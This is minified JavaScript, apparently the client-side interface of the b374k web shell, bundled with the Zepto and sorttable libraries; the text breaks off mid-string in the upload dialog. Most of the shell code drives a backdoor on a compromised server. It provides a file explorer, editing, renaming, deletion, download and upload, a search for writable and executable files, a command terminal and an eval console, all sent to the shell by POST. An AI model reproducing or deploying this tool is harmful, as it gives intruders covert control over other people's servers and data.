$.ajax(a)},$.ajaxSettings={type:"GET",beforeSend:empty,success:empty,error:empty,complete:empty,context:null,global:!0,xhr:function(){return new window.XMLHttpRequest},accepts:{script:"text/javascript, application/javascript, application/x-javascript",json:jsonType,xml:"application/xml, text/xml",html:htmlType,text:"text/plain"},crossDomain:!1,timeout:0,processData:!0,cache:!0},$.ajax=function(options){var settings=$.extend({},options||{}),deferred=$.Deferred&&$.Deferred();for(key in $.ajaxSettings)settings[key]===undefined&&(settings[key]=$.ajaxSettings[key]);ajaxStart(settings),settings.crossDomain||(settings.crossDomain=/^([\w-]+:)?\/\/([^\/]+)/.test(settings.url)&&RegExp.$2!=window.location.host),settings.url||(settings.url=window.location.toString()),serializeData(settings),settings.cache===!1&&(settings.url=appendQuery(settings.url,"_="+Date.now()));var dataType=settings.dataType,hasPlaceholder=/=\?/.test(settings.url);if(dataType=="jsonp"||hasPlaceholder)return hasPlaceholder||(settings.url=appendQuery(settings.url,settings.jsonp?settings.jsonp+"=?":settings.jsonp===!1?"":"callback=?")),$.ajaxJSONP(settings,deferred);var mime=settings.accepts[dataType],headers={},setHeader=function(a,b){headers[a.toLowerCase()]=[a,b]},protocol=/^([\w-]+:)\/\//.test(settings.url)?RegExp.$1:window.location.protocol,xhr=settings.xhr(),nativeSetHeader=xhr.setRequestHeader,abortTimeout;deferred&&deferred.promise(xhr),settings.crossDomain||setHeader("X-Requested-With","XMLHttpRequest"),setHeader("Accept",mime||"*/*");if(mime=settings.mimeType||mime)mime.indexOf(",")>-1&&(mime=mime.split(",",2)[0]),xhr.overrideMimeType&&xhr.overrideMimeType(mime);(settings.contentType||settings.contentType!==!1&&settings.data&&settings.type.toUpperCase()!="GET")&&setHeader("Content-Type",settings.contentType||"application/x-www-form-urlencoded");if(settings.headers)for(name in settings.headers)setHeader(name,settings.headers[name]);xhr.setRequestHeader=setHeader,xhr.onreadystatechange=function(){if(xhr.readyState==4){xhr.onreadystatechange=empty,clearTimeout(abortTimeout);var result,error=!1;if(xhr.status>=200&&xhr.status<300||xhr.status==304||xhr.status==0&&protocol=="file:"){dataType=dataType||mimeToDataType(settings.mimeType||xhr.getResponseHeader("content-type")),result=xhr.responseText;try{dataType=="script"?(1,eval)(result):dataType=="xml"?result=xhr.responseXML:dataType=="json"&&(result=blankRE.test(result)?null:$.parseJSON(result))}catch(e){error=e}error?ajaxError(error,"parsererror",xhr,settings,deferred):ajaxSuccess(result,xhr,settings,deferred)}else ajaxError(xhr.statusText||null,xhr.status?"error":"abort",xhr,settings,deferred)}};if(ajaxBeforeSend(xhr,settings)===!1)return xhr.abort(),ajaxError(null,"abort",xhr,settings,deferred),xhr;if(settings.xhrFields)for(name in settings.xhrFields)xhr[name]=settings.xhrFields[name];var async="async"in settings?settings.async:!0;xhr.open(settings.type,settings.url,async,settings.username,settings.password);for(name in headers)nativeSetHeader.apply(xhr,headers[name]);return settings.timeout>0&&(abortTimeout=setTimeout(function(){xhr.onreadystatechange=empty,xhr.abort(),ajaxError(null,"timeout",xhr,settings,deferred)},settings.timeout)),xhr.send(settings.data?settings.data:null),xhr},$.get=function(a,b,c,d){return $.ajax(parseArguments.apply(null,arguments))},$.post=function(a,b,c,d){var e=parseArguments.apply(null,arguments);return e.type="POST",$.ajax(e)},$.getJSON=function(a,b,c){var d=parseArguments.apply(null,arguments);return d.dataType="json",$.ajax(d)},$.fn.load=function(a,b,c){if(!this.length)return this;var d=this,e=a.split(/\s/),f,g=parseArguments(a,b,c),h=g.success;return e.length>1&&(g.url=e[0],f=e[1]),g.success=function(a){d.html(f?$("<div>").html(a.replace(rscript,"")).find(f):a),h&&h.apply(d,arguments)},$.ajax(g),this};var escape=encodeURIComponent;$.param=function(a,b){var c=[];return c.add=function(a,b){this.push(escape(a)+"="+escape(b))},serialize(c,a,b),c.join("&").replace(/%20/g,"+")}}(Zepto),function(a){a.fn.serializeArray=function(){var b=[],c;return a([].slice.call(this.get(0).elements)).each(function(){c=a(this);var d=c.attr("type");this.nodeName.toLowerCase()!="fieldset"&&!this.disabled&&d!="submit"&&d!="reset"&&d!="button"&&(d!="radio"&&d!="checkbox"||this.checked)&&b.push({name:c.attr("name"),value:c.val()})}),b},a.fn.serialize=function(){var a=[];return this.serializeArray().forEach(function(b){a.push(encodeURIComponent(b.name)+"="+encodeURIComponent(b.value))}),a.join("&")},a.fn.submit=function(b){if(b)this.bind("submit",b);else if(this.length){var c=a.Event("submit");this.eq(0).trigger(c),c.isDefaultPrevented()||this.get(0).submit()}return this}}(Zepto),function(a){"__proto__"in{}||a.extend(a.zepto,{Z:function(b,c){return b=b||[],a.extend(b,a.fn),b.selector=c||"",b.__Z=!0,b},isZ:function(b){return a.type(b)==="array"&&"__Z"in b}});try{getComputedStyle(undefined)}catch(b){var c=getComputedStyle;window.getComputedStyle=function(a){try{return c(a)}catch(b){return null}}}}(Zepto)
var h=!0,j=!1;sorttable={e:function(){arguments.callee.i||(arguments.callee.i=h,k&&clearInterval(k),document.createElement&&document.getElementsByTagName&&(sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,l(document.getElementsByTagName("table"),function(a){-1!=a.className.search(/\bsortable\b/)&&sorttable.k(a)})))},k:function(a){0==a.getElementsByTagName("thead").length&&(the=document.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);if(1==a.tHead.rows.length){sortbottomrows=[];for(var b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=document.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];var c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(document.getElementById("sorttable_sortfwdind")),sortrevind=document.createElement("span"),sortrevind.id="sorttable_sortrevind",sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(document.getElementById("sorttable_sortrevind")),sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=document.getElementById("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=document.getElementById("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=document.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML="&nbsp;&#x25BE;";this.appendChild(sortfwdind);row_array=[];col=this.o;rows=this.c.rows;for(var a=0;a<rows.length;a++)row_array[row_array.length]=[sorttable.d(rows[a].cells[col]),rows[a]];row_array.sort(this.p);tb=this.c;for(a=0;a<row_array.length;a++)tb.appendChild(row_array[a][1]);delete row_array}};if(c.addEventListener)c.addEventListener("click",e,j);else{e.f||(e.f=n++);c.b||(c.b={});var g=c.b.click;g||(g=c.b.click={},c.onclick&&(g[0]=c.onclick));g[e.f]=e;c.onclick=p}}}},j:function(a,b){sortfn=sorttable.l;for(var c=0;c<a.tBodies[0].rows.length;c++)if(text=sorttable.d(a.tBodies[0].rows[c].cells[b]),""!=text){if(text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/))return sorttable.n;if(possdate=text.match(sorttable.a)){first=parseInt(possdate[1]);second=parseInt(possdate[2]);if(12<first)return sorttable.g;if(12<second)return sorttable.m;sortfn=sorttable.g}}return sortfn},d:function(a){if(!a)return"";hasInputs="function"==typeof a.getElementsByTagName&&a.getElementsByTagName("input").length;if(""!=a.title)return a.title;if("undefined"!=typeof a.textContent&&!hasInputs)return a.textContent.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.innerText&&!hasInputs)return a.innerText.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.text&&!hasInputs)return a.text.replace(/^\s+|\s+$/g,"");switch(a.nodeType){case 3:if("input"==a.nodeName.toLowerCase())return a.value.replace(/^\s+|\s+$/g,"");case 4:return a.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(var b="",c=0;c<a.childNodes.length;c++)b+=sorttable.d(a.childNodes[c]);return b.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(a){newrows=[];for(var b=0;b<a.rows.length;b++)newrows[newrows.length]=a.rows[b];for(b=newrows.length-1;0<=b;b--)a.appendChild(newrows[b]);delete newrows},n:function(a,b){aa=parseFloat(a[0].replace(/[^0-9.-]/g,""));isNaN(aa)&&(aa=0);bb=parseFloat(b[0].replace(/[^0-9.-]/g,""));isNaN(bb)&&(bb=0);return aa-bb},l:function(a,b){return a[0].toLowerCase()==b[0].toLowerCase()?0:a[0].toLowerCase()<b[0].toLowerCase()?-1:1},g:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},m:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(var c=0,e=a.length-1,g=h;g;){for(var g=j,f=c;f<e;++f)0<b(a[f],a[f+1])&&(g=a[f],a[f]=a[f+1],a[f+1]=g,g=h);e--;if(!g)break;for(f=e;f>c;--f)0>b(a[f],a[f-1])&&(g=a[f],a[f]=a[f-1],a[f-1]=g,g=h);c++}}};document.addEventListener&&document.addEventListener("DOMContentLoaded",sorttable.e,j);if(/WebKit/i.test(navigator.userAgent))var k=setInterval(function(){/loaded|complete/.test(document.readyState)&&sorttable.e()},10);window.onload=sorttable.e;var n=1;function p(a){var b=h;a||(a=((this.ownerDocument||this.document||this).parentWindow||window).event,a.preventDefault=q,a.stopPropagation=r);var c=this.b[a.type],e;for(e in c)this.h=c[e],this.h(a)===j&&(b=j);return b}function q(){this.returnValue=j}function r(){this.cancelBubble=h}Array.forEach||(Array.forEach=function(a,b,c){for(var e=0;e<a.length;e++)b.call(c,a[e],e,a)});Function.prototype.forEach=function(a,b,c){for(var e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){var c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};var loading_count=0;var running=false;var defaultTab='explorer';var currentTab=$('#'+defaultTab);var tabScroll=new Object;var onDrag=false;var onScroll=false;var scrollDelta=1;var scrollCounter=0;var scrollSpeed=60;var scrollTimer='';var dragX='';var dragY='';var dragDeltaX='';var dragDeltaY='';var editSuccess='';var terminalHistory=new Array();var terminalHistoryPos=0;var evalSupported="";var evalReady=false;var resizeTimer='';var portableWidth=700;var portableMode=null;Zepto(function($){if(init_shell){var now=new Date();output("started @ "+now.toGMTString());output("cwd : "+get_cwd());output("module : "+module_to_load);show_tab();xpl_bind();eval_init();window_resize();xpl_update_status();$(window).on('resize',function(e){clearTimeout(resizeTimer);resizeTimer=setTimeout("window_resize()",1000)});$('.menuitem').on('click',function(e){selectedTab=$(this).attr('href').substr(2);show_tab(selectedTab)});$('#logout').on('click',function(e){var cookie=document.cookie.split(';');for(var i=0;i<cookie.length;i++){var entries=cookie[i],entry=entries.split("="),name=entry[0];document.cookie=name+"=''; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/"}localStorage.clear();location.href=targeturl});$('#totop').on('click',function(e){$(window).scrollTop(0)});$('#totop').on('mouseover',function(e){onScroll=true;clearTimeout(scrollTimer);start_scroll('top')});$('#totop').on('mouseout',function(e){onScroll=false;scrollCounter=0});$('#tobottom').on('click',function(e){$(window).scrollTop($(document).height()-$(window).height())});$('#tobottom').on('mouseover',function(e){onScroll=true;clearTimeout(scrollTimer);start_scroll('bottom')});$('#tobottom').on('mouseout',function(e){onScroll=false;scrollCounter=0});$('#basicInfo').on('mouseenter',function(e){$('#toggleBasicInfo').show()});$('#basicInfo').on('mouseleave',function(e){$('#toggleBasicInfo').hide()});$('#toggleBasicInfo').on('click',function(e){$('#basicInfo').hide();$('#showinfo').show();$('#toggleBasicInfo').hide();localStorage.setItem('infoBarShown','hidden')});$('#showinfo').on('click',function(e){$('#basicInfo').show();$('#showinfo').hide();localStorage.setItem('infoBarShown','shown')});if((infoBarShown=localStorage.getItem('infoBarShown'))){if(infoBarShown=='shown'){$('#basicInfo').show();$('#showinfo').hide()}else{$('#basicInfo').hide();$('#showinfo').show();$('#toggleBasicInfo').hide()}}else{info_refresh()}if(history.pushState){window.onpopstate=function(event){refresh_tab()}}else{window.historyEvent=function(event){refresh_tab()}}}});function output(str){console.log('b374k> '+str)}function window_resize(){bodyWidth=$('body').width();if(bodyWidth<=portableWidth){layout_portable()}else{layout_normal()}}function layout_portable(){nav=$('#nav');menu=$('#menu');headerNav=$('#headerNav');content=$('#content');nav.prependTo('#content');nav.css('padding','5px 8px');nav.css('margin-top','8px');nav.css('display','block');nav.addClass('border');menu.children().css('width','100%');menu.hide();$('#menuButton').remove();headerNav.prepend("<div id='menuButton' class='boxtitle' onclick=\"$('#menu').toggle();\" style='float-left;display:inline;padding:4px 8px;margin-right:8px;'>menu</div>");menu.attr('onclick',"\$('#menu').hide();");$('#xplTable tr>:nth-child(4)').hide();$('#xplTable tr>:nth-child(5)').hide();if(!win){$('#xplTable tr>:nth-child(6)').hide()}tblfoot=$('#xplTable tfoot td:last-child');if(tblfoot[0])tblfoot[0].colSpan=1;if(tblfoot[1])tblfoot[1].colSpan=2;$('.box').css('width','100%');$('.box').css('height','100%');$('.box').css('left','0px');$('.box').css('top','0px');paddingTop=$('#header').height();content.css('padding-top',paddingTop+'px');portableMode=true}function layout_normal(){nav=$('#nav');menu=$('#menu');content=$('#content');nav.insertAfter('#b374k');nav.css('padding','0');nav.css('margin-top','0');nav.css('display','inline');nav.removeClass('border');menu.children().css('width','auto');menu.show();$('#menuButton').remove();menu.attr('onclick',"");$('#xplTable tr>:nth-child(4)').show();$('#xplTable tr>:nth-child(5)').show();if(!win){$('#xplTable tr>:nth-child(6)').show();colspan=4}else colspan=3;tblfoot=$('#xplTable tfoot td:last-child');if(tblfoot[0])tblfoot[0].colSpan=colspan;if(tblfoot[1])tblfoot[1].colSpan=colspan+1;paddingTop=$('#header').height();content.css('padding-top',paddingTop+'px');portableMode=false}function start_scroll(str){if(str=='top'){to=$(window).scrollTop()-scrollCounter;scrollCounter=scrollDelta+scrollCounter;if(to<=0){to=0;onScroll=false}else if(onScroll){scrollTimer=setTimeout("start_scroll('top')",scrollSpeed);$(window).scrollTop(to)}}else if(str=='bottom'){to=$(window).scrollTop()+scrollCounter;scrollCounter=scrollDelta+scrollCounter;bottom=$(document).height()-$(window).height();if(to>=bottom){to=bottom;onScroll=false}else if(onScroll){scrollTimer=setTimeout("start_scroll('bottom')",scrollSpeed);$(window).scrollTop(to)}}}function get_cwd(){return decodeURIComponent(get_cookie('cwd'))}function fix_tabchar(el,e){if(e.keyCode==9){e.preventDefault();var s=el.selectionStart;el.value=el.value.substring(0,el.selectionStart)+"\t"+el.value.substring(el.selectionEnd);el.selectionEnd=s+1}}function get_cookie(key){var res;return(res=new RegExp('(?:^|; )'+encodeURIComponent(key)+'=([^;]*)').exec(document.cookie))?(res[1]):null}function set_cookie(key,value){document.cookie=key+'='+encodeURIComponent(value)}function html_safe(str){if(typeof(str)=="string"){str=str.replace(/&/g,"&amp;");str=str.replace(/"/g,"&quot;");str=str.replace(/'/g,"&#039;");str=str.replace(/</g,"&lt;");str=str.replace(/>/g,"&gt;")}return str}function ucfirst(str){return str.charAt(0).toUpperCase()+str.slice(1)}function time(){var d=new Date();return d.getTime()}function send_post(targetdata,callback,loading){if(loading==null)loading_start();$.ajax({url:targeturl,type:'POST',data:targetdata,success:function(res){callback(res);if(loading==null)loading_stop()},error:function(){if(loading==null)loading_stop()}})}function loading_start(){if(!running){$('#overlay').show();running=true;loading_loop()}}function loading_loop(){if(running){img=$('#loading');img.css('transform','rotate('+loading_count+'deg)');img.css('-ms-transform','rotate('+loading_count+'deg)');img.css('-webkit-transform','rotate('+loading_count+'deg)');loading_count+=7;if(loading_count>360)loading_count=0;if(running)setTimeout("loading_loop()",20)}}function loading_stop(){if(running){img=$('#loading');img.css('transform','rotate(0deg)');img.css('-ms-transform','rotate(0deg)');img.css('-webkit-transform','rotate(0deg)');$('#overlay').hide();running=false}}function show_tab(id){if(!id){if(location.hash!='')id=location.hash.substr(2);else id=defaultTab}refresh_tab(id)}function refresh_tab(id){if(!id){if(location.hash!='')id=location.hash.substr(2);else id=defaultTab}$('.menuitemSelected').removeClass("menuitemSelected");$('#menu'+id).addClass("menuitemSelected");tabScroll[currentTab.attr('id')]=$(window).scrollTop();currentTab.hide();currentTab=$('#'+id);currentTab.show();window[id]();if(tabScroll[id]){$(window).scrollTop(tabScroll[id])}hide_box()}function trap_enter(e,callback){if(e.keyCode==13){if(callback!=null)window[callback]()}}function show_box(title,content){onDrag=false;hide_box();box="<div class='box'><p class='boxtitle'>"+title+"<span class='boxclose floatRight'>x</span></p><div class='boxcontent'>"+content+"</div><div class='boxresult'></div></div>";$('#content').append(box);box_width=$('.box').width();body_width=$('body').width();box_height=$('.box').height();body_height=$('body').height();x=(body_width-box_width)/2;y=(body_height-box_height)/2;if(x<0||portableMode)x=0;if(y<0||portableMode)y=0;if(portableMode){$('.box').css('width','100%');$('.box').css('height','100%')}$('.box').css('left',x+'px');$('.box').css('top',y+'px');$('.boxclose').on('click',function(e){hide_box()});if(!portableMode){$('.boxtitle').on('click',function(e){if(!onDrag){dragDeltaX=e.pageX-parseInt($('.box').css('left'));dragDeltaY=e.pageY-parseInt($('.box').css('top'));drag_start()}else drag_stop()})}$(document).off('keyup');$(document).on('keyup',function(e){if(e.keyCode==27)hide_box()});if($('.box input')[0])$('.box input')[0].focus()}function hide_box(){$(document).off('keyup');$('.box').remove()}function drag_start(){if(!onDrag){onDrag=true;$('body').off('mousemove');$('body').on('mousemove',function(e){dragX=e.pageX;dragY=e.pageY});setTimeout('drag_loop()',50)}}function drag_loop(){if(onDrag){x=dragX-dragDeltaX;y=dragY-dragDeltaY;if(y<0)y=0;$('.box').css('left',x+'px');$('.box').css('top',y+'px');setTimeout('drag_loop()',50)}}function drag_stop(){onDrag=false;$('body').off('mousemove')}function get_all_cbox_selected(id,callback){var buffer=new Array();$('#'+id).find('.cBoxSelected').not('.cBoxAll').each(function(i){if((href=window[callback]($(this)))){buffer[i]=href}});return buffer}function cbox_bind(id,callback){$('#'+id).find('.cBox').off('click');$('#'+id).find('.cBoxAll').off('click');$('#'+id).find('.cBox').on('click',function(e){if($(this).hasClass('cBoxSelected')){$(this).removeClass('cBoxSelected')}else $(this).addClass('cBoxSelected');if(callback!=null)window[callback]()});$('#'+id).find('.cBoxAll').on('click',function(e){if($(this).hasClass('cBoxSelected')){$('#'+id).find('.cBox').removeClass('cBoxSelected');$('#'+id).find('.cBoxAll').removeClass('cBoxSelected')}else{$('#'+id).find('.cBox').not('.cBoxException').addClass('cBoxSelected');$('#'+id).find('.cBoxAll').not('.cBoxException').addClass('cBoxSelected')}if(callback!=null)window[callback]()})}function action(path,type){title="Action";content='';if(type=='file')content="<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='edit button'>edit</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='dl button'>download</span></td></tr></table>";if(type=='dir')content="<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span></td></tr></table>";if(type=='dot')content="<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='newfile button'>new file</span><span class='newfolder button'>new folder</span></td></tr></table>";show_box(title,content);xpl_bind()}function navigate(path,showfiles){if(showfiles==null)showfiles='true';send_post({cd:path,showfiles:showfiles},function(res){if(res!='error'){splits=res.split('{[|b374k|]}');if(splits.length==3){$('#nav').html(splits[1]);if(showfiles=='true'){$('#explorer').html('');$('#explorer').html(splits[2]);sorttable.k($('#xplTable').get(0))}$('#terminalCwd').html(html_safe(get_cwd())+'&gt;');xpl_bind();window_resize()}}})}function view(path,type,preserveTimestamp){if(preserveTimestamp==null)preserveTimestamp='true';send_post({viewFile:path,viewType:type,preserveTimestamp:preserveTimestamp},function(res){if(res!='error'){$('#explorer').html('');$('#explorer').html(res);xpl_bind();show_tab('explorer');if((type=='edit')||(type=='hex')){editResult=(type=='edit')?$('#editResult'):$('#editHexResult');if(editSuccess=='success'){editResult.html(' ( File saved )')}else if(editSuccess=='error'){editResult.html(' ( Failed to save file )')}editSuccess=''}cbox_bind('editTbl')}})}function view_entry(el){if($(el).attr('data-path')!=''){entry=$(el).attr('data-path');$('#form').append("<input type='hidden' name='viewEntry' value='"+entry+"'>");$('#form').submit();$('#form').html('')}}function ren(path){title="Rename";content="<table class='boxtbl'><tr><td class='colFit'>Rename to</td><td><input type='text' class='renameFileTo' value='"+path+"' onkeydown=\"trap_enter(event, 'ren_go');\"><input type='hidden' class='renameFile' value='"+path+"'></td></tr><tr><td colspan='2'><span class='button' onclick='ren_go();'>rename</span></td></tr></table>";show_box(title,content)}function ren_go(){renameFile=$('.renameFile').val();renameFileTo=$('.renameFileTo').val();send_post({renameFile:renameFile,renameFileTo:renameFileTo},function(res){if(res!='error'){navigate(res);$('.boxresult').html('Operation(s) succeeded');$('.renameFile').val($('.renameFileTo').val())}else $('.boxresult').html('Operation(s) failed')})}function newfolder(path){title="New Folder";path=path+'newfolder-'+time();content="<table class='boxtbl'><tr><td class='colFit'>Folder Name</td><td><input type='text' class='newFolder' value='"+path+"' onkeydown=\"trap_enter(event, 'newfolder_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfolder_go();'>create</span></td></tr></table>";show_box(title,content)}function newfolder_go(){newFolder=$('.newFolder').val();send_post({newFolder:newFolder},function(res){if(res!='error'){navigate(res);$('.boxresult').html('Operation(s) succeeded')}else $('.boxresult').html('Operation(s) failed')})}function newfile(path){title="New File";path=path+'newfile-'+time();content="<table class='boxtbl'><tr><td class='colFit'>File Name</td><td><input type='text' class='newFile' value='"+path+"' onkeydown=\"trap_enter(event, 'newfile_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfile_go();'>create</span></td></tr></table>";show_box(title,content)}function newfile_go(){newFile=$('.newFile').val();send_post({newFile:newFile},function(res){if(res!='error'){view(newFile,'edit');$('.boxresult').html('Operation(s) succeeded')}else $('.boxresult').html('Operation(s) failed')})}function viewfileorfolder(){title="View File / Folder";content="<table class='boxtbl'><tr><td><input type='text' class='viewFileorFolder' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'viewfileorfolder_go');\"></td></tr><tr><td><span class='button' onclick='viewfileorfolder_go();'>view</span></td></tr></table>";show_box(title,content)}function viewfileorfolder_go(){entry=$('.viewFileorFolder').val();send_post({viewFileorFolder:entry},function(res){if(res!='error'){if(res=='file'){view(entry,'auto');show_tab('explorer')}else if(res=='folder'){navigate(entry);show_tab('explorer')}}})}function del(path){title="Delete";content="<table class='boxtbl'><tr><td class='colFit'>Delete</td><td><input type='text' class='delete' value='"+path+"' onkeydown=\"trap_enter(event, 'delete_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='delete_go();'>delete</span></td></tr></table>";show_box(title,content)}function delete_go(){path=$('.delete').val();send_post({delete:path},function(res){if(res!='error'){navigate(res);$('.boxresult').html('Operation(s) succeeded')}else $('.boxresult').html('Operation(s) failed')})}function find(path){findfile="<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find File</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findfilePath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td style='border-bottom:none;'>Filename contains</td><td style='border-bottom:none;'><input type='text' class='findfileFilename' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileFilenameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileFilenameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td style='border-bottom:none;'>File contains</td><td style='border-bottom:none;'><input type='text' class='findfileContains' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileContainsRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileContainsInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findfileReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findfileWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findfileExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_file();\">find</span></td></tr><tr><td colspan='2' class='findfileResult'></td></tr></tfoot></table>";findfolder="<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find Folder</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findFolderPath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td style='border-bottom:none;'>Foldername contains</td><td style='border-bottom:none;'><input type='text' class='findFoldername' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td></td><td><span class='cBox findFoldernameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;&nbsp;<span class='cBox findFoldernameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_folder();\">find</span></td></tr><tr><td colspan='2' class='findResult'></td></tr></tfoot></table>";$('#explorer').html("<div id='xplUpload'>"+findfile+'<br>'+findfolder+'</div>');cbox_bind('xplUpload')}function find_go_file(){find_go('file')}function find_go_folder(){find_go('folder')}function find_go(findType){findPath=(findType=='file')?$('.findfilePath').val():$('.findFolderPath').val();findResult=(findType=='file')?$('.findfileResult'):$('.findResult');findName=(findType=='file')?$('.findfileFilename').val():$('.findFoldername').val();findNameRegex=(findType=='file')?$('.findfileFilenameRegex').hasClass('cBoxSelected').toString():$('.findFoldernameRegex').hasClass('cBoxSelected').toString();findNameInsensitive=(findType=='file')?$('.findfileFilenameInsensitive').hasClass('cBoxSelected').toString():$('.findFoldernameInsensitive').hasClass('cBoxSelected').toString();findContent=(findType=='file')?$('.findfileContains').val():"";findContentRegex=(findType=='file')?$('.findfileContainsRegex').hasClass('cBoxSelected').toString():"";findContentInsensitive=(findType=='file')?$('.findfileContainsInsensitive').hasClass('cBoxSelected').toString():"";findReadable=(findType=='file')?$('.findfileReadable').hasClass('cBoxSelected').toString():$('.findWritable').hasClass('cBoxSelected').toString();findWritable=(findType=='file')?$('.findfileWritable').hasClass('cBoxSelected').toString():$('.findReadable').hasClass('cBoxSelected').toString();findExecutable=(findType=='file')?$('.findfileExecutable').hasClass('cBoxSelected').toString():$('.findExecutable').hasClass('cBoxSelected').toString();send_post({findType:findType,findPath:findPath,findName:findName,findNameRegex:findNameRegex,findNameInsensitive:findNameInsensitive,findContent:findContent,findContentRegex:findContentRegex,findContentInsensitive:findContentInsensitive,findReadable:findReadable,findWritable:findWritable,findExecutable:findExecutable},function(res){if(res!='error'){findResult.html(res)}})}function ul_go_comp(){ul_go('comp')}function ul_go_url(){ul_go('url')}function ul(path){ulcomputer="<table class='boxtbl ulcomp'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Computer <a 